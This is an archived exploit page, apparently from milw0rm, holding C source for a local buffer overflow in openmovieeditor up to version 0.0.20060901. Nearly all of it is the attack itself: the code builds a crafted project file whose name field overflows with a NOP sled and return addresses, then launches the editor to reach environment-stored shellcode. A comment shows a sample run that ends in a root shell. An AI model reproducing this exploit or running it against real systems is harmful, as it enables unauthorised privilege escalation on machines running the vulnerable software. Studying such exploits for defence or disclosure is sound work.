<html><head><title>openmovieeditor <= 0.0.20060901 (name) Local Buffer Overflow Exploit</title></head><pre>/*
 * openmovieeditor buffer overflow exploit
 * by qnix &lt; qnix[at]bsdmail[dot]org
 *
 * Dont forget to change the return address (RETADDR)
 *
 *
 * --------------------------
 *  devil: ~ \&gt; envt/envt -s 2
 *  Shellcode: linux/x86 setuid(0),setgid(0) execve(/bin/sh, [/bin/sh, NULL]) 37 bytes
 *  [+]      Setting memory for the shellcode.
 *  [+]      Copying shellcode to memory.
 *  [+]      Putting shellcode in the environment.
 *  [+]      Going into the environment (ENVT) and exiting ....
 *  Done 37 bytes loaded to (ENVT)
 *  devil: ~ \&gt; envt/envt
 *  SHELLCODE FOUND IN 0xbffffbf5
 *  devil: ~ \&gt; ./ome_buf 
 *
 *  *****************************************
 *  openmovieeditor buffer overflow exploit
 *  by qnix &lt; qnix[at]bsdmail[dot]org
 *  Dont forget to change the return address
 *  *****************************************
 *
 *  Usage : ./ome_buf &lt;filename&gt; &lt;openmovieeditor&gt;
 *  devil: ~ \&gt; ./ome_buf Video\ Projects/exploit.vproj /usr/local/bin/openmovieeditor 
 *
 *  [+] Video Projects/exploit.vproj Created|Opened
 *  [~] Desired Return Addr : 0xbffffbf5
 *  [~] Offset from ESP     : 0x0
 *  [+] Executing openmovieeditor
 *
 *  sh-3.1# whoami;id
 *  root
 *  uid=0(root) gid=0(root) groups=0(root)
 *  sh-3.1# exit
 *  exit
 *
 * --------------------------
 *
 * */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define RETADDR  '\xbf\xff\xfb\xf5'
#define SLEEP	sleep(1);

int main(int argc,char *argv[]) {
	FILE *output;

	int i, offset;
	long ret, *addr_ptr;
	char *buffer, *ptr;

	offset = 0;
	ret = RETADDR - offset;

	if(argc != 3) {
		fprintf(stderr,&quot;\n*****************************************\n&quot;);
		fprintf(stderr,&quot;openmovieeditor buffer overflow exploit\n&quot;);
		fprintf(stderr,&quot;by qnix &lt; qnix[at]bsdmail[dot]org\n&quot;);
		fprintf(stderr,&quot;Dont forget to change the return address\n&quot;);
		fprintf(stderr,&quot;*****************************************\n\n&quot;);

		fprintf(stderr,&quot;Usage : %s &lt;filename&gt; &lt;openmovieeditor&gt;\n&quot;,argv[0]);
		return 0;
	}

	output = fopen(argv[1],&quot;w+&quot;);

	if(output == 0) {
		fprintf(stderr,&quot;\n[-] Cannot create %s\n&quot;,argv[1]);
		SLEEP
		return 0;
	} else {
		fprintf(stdout,&quot;\n[+] %s Created|Opened\n&quot;,argv[1]);
		SLEEP
	}

	fprintf(output,&quot;&lt;?xml version=\&quot;1.0\&quot; standalone=\&quot;no\&quot; ?&gt;\n&quot;);
	fprintf(output,&quot;&lt;open_movie_editor_project&gt;\n&quot;);
	fprintf(output,&quot;    &lt;version&gt;0.0.20060901&lt;/version&gt;\n&quot;);

	/* evil code ^_^ */
	buffer = malloc(2300);
	ptr = buffer;
	addr_ptr = (long *) ptr;
	for(i=0; i &lt; 2300; i+=4)
	{ *(addr_ptr++) = ret; }
	for(i=0; i &lt; 1040; i++)
	{ buffer[i] = '\x90'; }
	ptr = buffer + 1044;
	buffer[2300-1] = 0;

	fprintf(output,&quot;    &lt;name&gt;%s&lt;/name&gt;\n&quot;,buffer);
	fprintf(output,&quot;    &lt;zoom value=\&quot;1.000000\&quot; /&gt;\n&quot;);
	fprintf(output,&quot;    &lt;scroll value=\&quot;0\&quot; /&gt;\n&quot;);
	fprintf(output,&quot;    &lt;stylus value=\&quot;0\&quot; /&gt;\n&quot;);
	fprintf(output,&quot;    &lt;video_tracks&gt;\n&quot;);
	fprintf(output,&quot;    &lt;track /&gt;\n&quot;);
	fprintf(output,&quot;    &lt;track /&gt;\n&quot;);
	fprintf(output,&quot;    &lt;/video_tracks&gt;\n&quot;);
	fprintf(output,&quot;    &lt;audio_tracks&gt;\n&quot;);
	fprintf(output,&quot;    &lt;track /&gt;\n&quot;);
	fprintf(output,&quot;    &lt;track /&gt;\n&quot;);
	fprintf(output,&quot;    &lt;/audio_tracks&gt;\n&quot;);
 	fprintf(output,&quot;&lt;/open_movie_editor_project&gt;\n&quot;);

	fprintf(stdout,&quot;[~] Desired Return Addr : 0x%x\n&quot;, ret);
	SLEEP
	fprintf(stdout,&quot;[~] Offset from ESP     : 0x%x\n&quot;, offset);
	SLEEP

	fprintf(stdout,&quot;[+] Executing openmovieeditor\n\n&quot;);
	fclose(output);
	SLEEP

	execl(argv[2],&quot;openmovieeditor&quot;,0);

	return 0;
}	

// milw0rm.com [2006-09-09]</pre></html>